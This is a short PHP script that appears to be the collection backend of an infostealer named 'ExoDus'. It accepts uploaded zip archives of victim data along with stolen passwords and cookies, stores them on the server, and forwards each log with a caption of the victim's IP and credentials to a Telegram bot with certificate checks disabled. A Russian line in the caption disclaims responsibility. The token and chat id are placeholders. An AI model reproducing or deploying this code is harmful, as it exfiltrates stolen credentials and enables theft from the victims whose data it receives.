<?php
$date = date("d-m-Y");
$time = date("h-i");
$ip = $_SERVER['REMOTE_ADDR'];
$countcu = $_GET['cuc'];
$pass = $_GET['pwc'];
$country = $_GET['country'];




$data = base64_decode("chatid");



move_uploaded_file($_FILES['file']['tmp_name'], $_SERVER['DOCUMENT_ROOT']."/logs/ExoDus-" . $ip . $date . $time . $rnd .".zip");

$desc = "<b>============NEWLOG==========</b>\n". "<b>Date</b>: " . $date . "\n<b>time</b>: " . $time . "\n<b>IP address: </b>" . $ip ."\n<b>passwords: </b>". $pass . "\n<b>cookie: </b> ".$countcu."\n<b>==========ExoDus=========</b>". "<b>\nВАЖНО\nя не несу не какую ответственность за ваши действия</b>";
$url = "https://api.telegram.org/bottoken/sendDocument";
$document = new CURLFile($_SERVER['DOCUMENT_ROOT']."/logs/ExoDus-" . $ip . $date . $time . $rnd .".zip");
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ["chat_id" => $data, "document" => $document, "caption" => $desc, "parse_mode" => HTML]);
curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$out = curl_exec($ch);
curl_close($ch);




?>
